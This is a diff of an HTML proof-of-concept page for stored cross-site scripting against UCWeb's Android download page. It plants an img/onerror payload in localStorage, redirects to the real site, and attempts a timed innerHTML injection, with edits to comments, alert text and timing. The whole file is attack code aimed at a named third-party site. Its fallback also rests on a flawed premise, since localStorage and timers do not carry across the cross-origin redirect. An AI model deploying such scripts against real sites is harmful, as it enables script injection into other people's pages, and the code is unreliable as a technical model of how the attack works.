@@ -5,26 +5,26 @@
     <meta charset="UTF-8" />
   </head>
   <body>
-    <h2>Setting up Stored XSS... Please wait</h2>
+    <h2>Injecting Stored XSS...</h2>
     <script>
-      // Step 1: Set malicious payload in localStorage
       localStorage.setItem(
         "ad333bae-5a0f-4221-9821-0399fb113a42-download",
-        `<img src="x" onerror="alert('Stored XSS by Neha')">`
+        `<img src="x" onerror="alert('Stored XSS ✅')">`
       );
 
-      // Step 2: Redirect to vulnerable page
+      // Redirect to UCWeb
       location.href = "https://www.ucweb.com/download/android";
 
-      // Optional fallback (in case page allows JS injection again)
+      // Optional: Try to inject it manually after redirect (if UCWeb allows JS again)
       setTimeout(() => {
         try {
-          document.getElementById("root").innerHTML =
-            localStorage.getItem("ad333bae-5a0f-4221-9821-0399fb113a42-download");
+          document.getElementById("root").innerHTML = localStorage.getItem(
+            "ad333bae-5a0f-4221-9821-0399fb113a42-download"
+          );
         } catch (e) {
-          console.warn("Manual injection failed", e);
+          console.log("Injection fallback failed", e);
         }
-      }, 3000);
+      }, 4000);
     </script>
   </body>
 </html>
